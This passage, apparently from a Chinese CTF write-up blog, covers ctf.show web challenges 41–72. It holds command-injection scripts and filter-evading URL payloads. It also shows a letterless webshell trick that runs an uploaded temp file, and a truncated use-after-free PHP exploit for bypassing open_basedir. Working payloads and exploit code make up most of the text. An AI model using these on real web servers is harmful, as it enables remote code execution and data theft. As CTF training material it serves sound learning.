#data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#x27;包裹，这样是变量的固定格式，另一个也是如此，两个进行按位与运算，然后得到对应值</span><br><span class="line">ans1=&quot;&quot;#对ans1进行重新赋值</span><br><span class="line">ans2=&quot;&quot;#对ans2进行重新赋值</span><br><span class="line">for k in range(0,len(myb)):#设置k的范围为(0,len(myb))</span><br><span class="line">    myfun(k,myb)#再次引用自定义函数</span><br><span class="line">data2=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line"> </span><br><span class="line">data=&#123;&quot;c&quot;:data1+data2&#125;</span><br><span class="line">r=requests.post(url=url,data=data)#r等于以post方式传递参数，其中url=上面的url，data等于刚刚得到的data</span><br><span class="line">print(r.text) #输出得到的文本信息</span><br></pre></td></tr></table></figure>



<p>脚本二，官方给的wp</p>
<p>rce_or.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">	for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">		if($i&lt;16)&#123;</span><br><span class="line">			$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$hex_i=dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		if($j&lt;16)&#123;</span><br><span class="line">			$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$hex_j=dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		$preg = &#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;;</span><br><span class="line">		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">					echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		else&#123;</span><br><span class="line">		$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">		$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">		$c=(urldecode($a)|urldecode($b));</span><br><span class="line">		if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">			$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行</span><br><span class="line">if(len(argv)!=2):</span><br><span class="line">   print(&quot;=&quot;*50)</span><br><span class="line">   print(&#x27;USER：python exp.py &lt;url&gt;&#x27;)</span><br><span class="line">   print(&quot;eg：  python exp.py http://ctf.show/&quot;)</span><br><span class="line">   print(&quot;=&quot;*50)</span><br><span class="line">   exit(0)</span><br><span class="line">url=argv[1]</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line">   </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))</span><br><span class="line">   data=&#123;</span><br><span class="line">       &#x27;c&#x27;:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   print(&quot;\n[*] result:\n&quot;+r.text)</span><br></pre></td></tr></table></figure>

<p>python exp.py url</p>
<h3 id="web-42"><a href="#web-42" class="headerlink" title="web-42*"></a>web-42*</h3><p>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</p>
<p>这条命令用到了重定向绑定，采作用是错误输出将和标准输出同用一个文件描述符,简单的说就是标准输出和错误输出输出到同一个地方</p>
<p>其简单理解就是把标准输出和错误输出全扔了</p>
<p>直接截断就行：?c&#x3D;cat%20flag.php%0a</p>
<h3 id="web-43"><a href="#web-43" class="headerlink" title="web-43"></a>web-43</h3><p>?c&#x3D;tac%20flag.php%0a</p>
<h3 id="web-44"><a href="#web-44" class="headerlink" title="web-44"></a>web-44</h3><p>?c&#x3D;tac%20fla%27%27g.php%0a</p>
<h3 id="web-45"><a href="#web-45" class="headerlink" title="web-45"></a>web-45</h3><p>?c&#x3D;tac%09fla%27%27g.php%0a</p>
<h3 id="web-46"><a href="#web-46" class="headerlink" title="web-46"></a>web-46</h3><p>&#x2F;?c&#x3D;tac%09fla?.php%0a</p>
<p>&#x2F;?c&#x3D;nl&lt;fla%27%27g.php||</p>
<h3 id="web-47"><a href="#web-47" class="headerlink" title="web-47"></a>web-47</h3><p>&#x2F;?c&#x3D;tac%09fl%27%27ag.php%0a</p>
<h3 id="web-48"><a href="#web-48" class="headerlink" title="web-48"></a>web-48</h3><p>&#x2F;?c&#x3D;tac%09fla%27%27g.php%0a</p>
<h3 id="web-49"><a href="#web-49" class="headerlink" title="web-49"></a>web-49</h3><p>&#x2F;?c&#x3D;tac%09fla?.php%0a</p>
<h3 id="web-50"><a href="#web-50" class="headerlink" title="web-50"></a>web-50</h3><p>&#x2F;?c&#x3D;tac%09fla%27%27g.php%0a</p>
<h3 id="web-51"><a href="#web-51" class="headerlink" title="web-51"></a>web-51</h3><p>&#x2F;?c&#x3D;ta%27%27c&lt;&gt;fla%27%27g.php%0a</p>
<h3 id="web-52"><a href="#web-52" class="headerlink" title="web-52"></a>web-52</h3><p>&#x2F;?c&#x3D;ta%27%27c${IFS}fl%27%27ag.php%0a</p>
<p>没给出flag，看看目录</p>
<p>&#x2F;?c&#x3D;ls${IFS}&#x2F;||</p>
<p>&#x2F;?c&#x3D;cp${IFS}&#x2F;fl%27%27ag${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;a.txt||</p>
<p>&#x2F;a.txt</p>
<h3 id="web-53"><a href="#web-53" class="headerlink" title="web-53"></a>web-53</h3><p>&#x2F;?c&#x3D;nl${IFS}fl%27%27ag.php</p>
<h3 id="web-54"><a href="#web-54" class="headerlink" title="web-54*"></a>web-54*</h3><p>这道题环境有点怪。如果先mv一份，就寄了。所以不要mv！！！</p>
<p>&#x2F;?c&#x3D;rev${IFS}fl?g.php</p>
<p>&#x2F;?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p>
<p>&#x2F;?c&#x3D;xxd${IFS}fla?.php</p>
<p>二进制显示</p>
<h3 id="web-55"><a href="#web-55" class="headerlink" title="web-55*"></a>web-55*</h3><p>什么骚操作</p>
<p>&#x2F;bin&#x2F;base64 flag.php</p>
<p>&#x2F;?c&#x3D;&#x2F;???&#x2F;????64 ????????</p>
<p>无敌的p神。。。。。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p>本关是属于那种无字母构造webshell的，那么绕过思路呢就是利用linux shell命令，用.可以执行一个文件中的命令，例如.3.php就是执行3.php中的命令<br>此时我们应该去哪里找这个上传的文件呢，扩充一个小的知识点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post上传一个文件后，此时PHP会将我们上传的文件保存在临时文件夹下，</span><br><span class="line">默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机生成的大小写字母。</span><br></pre></td></tr></table></figure>

<p>此时我们肯定想的是构造如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/?????????</span><br></pre></td></tr></table></figure>

<p>可是符号这种条件的文件有好多个，无法匹配到我们想要的那个文件，这时我们想到glob支持利用[0-9]设置范围，那同理我们也可以设置范围为[A-Z],但是因为字母被过滤掉了，所以我们用A的前一位@和Z的后一位[来进行替代，构造如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=.%20/???/????????[@-[]</span><br><span class="line">注：%20是空格，也可以用+来代替，目的是进行隔断</span><br></pre></td></tr></table></figure>

<p>此时写一个post包，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://9e1a3122-1876-431c-8e68-91515f1ce03d.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>放到一个html文件中，并打开<br>再构造一个php文件，用于我们访问，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>此时我们选中php文件，进行抓包，并把payload输入到其中。最后更改php文件中内容，把<code>ls</code>改为<code>cat flag.php</code>，执行结果如下</p>
<h3 id="web-56"><a href="#web-56" class="headerlink" title="web-56"></a>web-56</h3><p>看上面p神的文章，博客里面还有一篇，都要看。</p>
<p>下面给出脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://63212fe8-01b7-4867-ab04-458e8e1a39fb.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span><br><span class="line">files=&#123;&#x27;file&#x27;:&#x27;ls&#x27;&#125;</span><br><span class="line">for i in range(1000):</span><br><span class="line">	response=requests.post(url,files=files)</span><br><span class="line">	html = response.text</span><br><span class="line">	print(html)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files=&#123;&#x27;file&#x27;:&#x27;cat flag.php&#x27;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-57"><a href="#web-57" class="headerlink" title="web-57*"></a>web-57*</h3><p>首先需要了解一下取反运算，如果没有对取反没有了解可以自行百度一下，取反有一个公式，无论是正数还是负数都是有效的，<code>~a=-(a+1)</code><br>其次，在linux中，没有字母也可以输出数字，具体如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(())=0</span><br><span class="line">$((~$(())))=-1</span><br><span class="line">原理是：</span><br><span class="line">$&#123;_&#125;=&quot;&quot;</span><br><span class="line">$(($&#123;_&#125;))=0</span><br><span class="line">$((~$(($&#123;_&#125;))))=-1</span><br><span class="line">然后拼接出-36在进行取反</span><br><span class="line"></span><br><span class="line">注意的是：$&#123;_&#125;会输出上一次的执行结果</span><br></pre></td></tr></table></figure>

<p>&#x2F;?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p>
<h3 id="web-58"><a href="#web-58" class="headerlink" title="web-58*"></a>web-58*</h3><p>c&#x3D;show_source(‘flag.php’);</p>
<h3 id="web-66"><a href="#web-66" class="headerlink" title="web-66"></a>web-66</h3><p>c&#x3D;print_r(scandir(“&#x2F;“));</p>
<p>c&#x3D;highlight_file(“&#x2F;flag.txt”);</p>
<h3 id="web-68"><a href="#web-68" class="headerlink" title="web-68"></a>web-68</h3><p>c&#x3D;var_dump(scandir(‘&#x2F;‘));</p>
<p>c&#x3D;include(‘&#x2F;flag.txt’);</p>
<h3 id="web-70"><a href="#web-70" class="headerlink" title="web-70"></a>web-70</h3><p>c&#x3D;var_export(scandir(‘&#x2F;‘));</p>
<p>c&#x3D;include(‘&#x2F;flag.txt’);</p>
<h3 id="web-71"><a href="#web-71" class="headerlink" title="web-71"></a>web-71</h3><p>ob_get_contents()：返回输出缓冲区的内容，只是得到输出缓冲区的内容，但不清除它。此函数返回输出缓冲区的内容，或者如果输出缓冲区无效将返回FALSE 。</p>
<p>ob_end_clean()：清空（擦除）缓冲区并关闭输出缓冲，此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
<p>c&#x3D;var_export(scandir(‘&#x2F;‘));die();</p>
<p>c&#x3D;include(‘&#x2F;flag.txt’);exit(0);</p>
<h3 id="web-72"><a href="#web-72" class="headerlink" title="web-72*"></a>web-72*</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hookjoy/p/12846164.html">https://www.cnblogs.com/hookjoy/p/12846164.html</a></p>
<p>glob查它目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob://./*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function <span class="title function_">ctfshow</span><span class="params">($cmd)</span> &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> &#123;</span></span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!isset($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> &#123;</span></span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= <span class="built_in">sprintf</span>(<span class="string">&quot;%c&quot;</span>,($ptr &amp; <span class="number">0xff</span>));</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = <span class="built_in">sprintf</span>(<span class="string">&quot;%c&quot;</span>,($v &amp; <span class="number">0xff</span>));</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = <span class="built_in">strlen</span>($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">parse_elf</span><span class="params">($base)</span> &#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get_basic_funcs</span><span class="params">($base, $elf)</span> &#123;</span><br><span class="line">        <span class="built_in">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span 